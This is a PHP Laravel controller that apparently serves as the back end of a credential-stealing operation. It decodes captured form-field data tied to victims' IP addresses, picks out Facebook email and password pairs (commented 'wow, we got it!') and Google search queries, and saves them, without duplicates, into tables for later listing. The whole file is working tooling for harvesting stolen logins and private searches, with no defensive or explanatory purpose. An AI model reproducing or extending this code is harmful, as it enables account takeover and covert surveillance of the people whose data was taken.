<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;

use Illuminate\Http\Request;
use App\Requestall;
use App\Fb;
use App\Gg;
use phpDocumentor\Reflection\Types\Integer;

class RequestallController extends BaseController
{
    public function index()
    {
        $data['activeMenu'] = 'filter';
        return view('filter')->with($data);
    }

    public function listFb()
    {
        $fb = new Fb;
        $data['fb'] = $fb
            ->orderBy('id','desc')
            ->get();
        $data['activeMenu'] = 'fb';
        return view('list-data')->with($data);
    }

    public function decodeData($input)
    {
        $result['data'] = json_decode(urldecode(base64_decode($input->hostname)));
        $result['ip'] = $input->ip;
        return $result;
    }

    public function getData($data, $findString, $firstClassName, $secondClassName)
    {
        $result = [];
        foreach ($data as $item) {
            $ipAddress = $item->ip;
            $a = $this->decodeData($item)['data'];
            if($a){
                foreach ($a as $k => $it) {
                    // check if domain contain string facebook.com and class name = email
                    if(strpos($it->dm, $findString) && (!empty($it->cn) && $it->cn == $firstClassName)){
                        // for filter fb
                        if($secondClassName){
                            // check if next object contain pwd
                            if( !empty($a[$k+1]) ){
                                if( !empty($a[$k+1]->cn) && $a[$k+1]->cn == $secondClassName ){
                                    // wow, we got it!
                                    array_push($result, [
                                        'email' => $it->vl,
                                        'pwd' => $a[$k+1]->vl,
                                        'ip' => $ipAddress
                                    ]);
                                }
                            }
                        }else{
                            // for filter google query
                            array_push($result, [
                                'domain' => $it->dm,
                                'query' => $it->vl,
                                'ip' => $ipAddress
                            ]);
                        }
                    }
                }
            }
        }
        return $result;
    }

    public function filter(Request $request)
    {
        $data = [];
        $params = $request->all();
        $filterWhat = $params['filterWhat'];
        if($filterWhat == 'fb'){
            $data = $this->filterFb($params);
        }elseif ($filterWhat == 'gg'){
            $data = $this->filterGg($params);
        }

        return response()->json($data);
    }

    public function filterFb($params)
    {
        $offset = $params['offset'];
        $limit = $params['limit'];

        $result = Requestall::offset($offset)
            ->limit($limit)
            ->orderBy('id')
            ->get();
        if($result){
            // Get list fb account
            $fbAccount = $this->getData($result, 'facebook.com', 'email', 'pass');
            // Insert to table fb
            $data['insertedRows'] = $this->insertFb($fbAccount);
            $data['offset'] = (Int)$offset;
        }else{
            $data['insertedRows'] = -1;
            $data['offset'] = (Int)$offset;
        }
        $data['countOriginData'] = count($result);
        return $data;
    }

    public function filterGg($params)
    {
        $offset = $params['offset'];
        $limit = $params['limit'];

        $result = Requestall::offset($offset)
            ->limit($limit)
            ->orderBy('id')
            ->get();
        if($result){
            // Get list fb account
            $ggQuery = $this->getData($result, 'google.com', 'q', null);
            // Insert to table gg
            $data['insertedRows'] = $this->insertGg($ggQuery);
            $data['offset'] = (Int)$offset;
        }else{
            $data['insertedRows'] = -1;
            $data['offset'] = (Int)$offset;
        }
        $data['countOriginData'] = count($result);
        return $data;
    }

    public function insertGg($data)
    {
        $countInserted = 0;
        $obj = new Gg;
        foreach ($data as $item) {
            // check exist
            $count = $obj::where('domain', '=', $item['domain'])
                ->where('query', '=', $item['query'])
                ->where('ip', '=', $item['ip'])
                ->count();
            // if not exist then insert to DB
            if($count == 0){
                $gg = new Gg;
                $gg->domain = $item['domain'];
                $gg->query = $item['query'];
                $gg->ip = $item['ip'];

                $gg->save();
                $countInserted++;
            }
        }
        return $countInserted;
    }

    public function insertFb($data)
    {
        $countInserted = 0;
        $obj = new Fb;
        foreach ($data as $item) {
            // check exist
            $count = $obj::where('email', '=', $item['email'])->where('pwd', '=', $item['pwd'])->count();
            // if not exist then insert to DB
            if($count == 0){
                $fb = new Fb;
                $fb->email = $item['email'];
                $fb->pwd = $item['pwd'];
                $fb->ip = $item['ip'];
                $fb->save();
                $countInserted++;
            }
        }
        return $countInserted;
    }
}
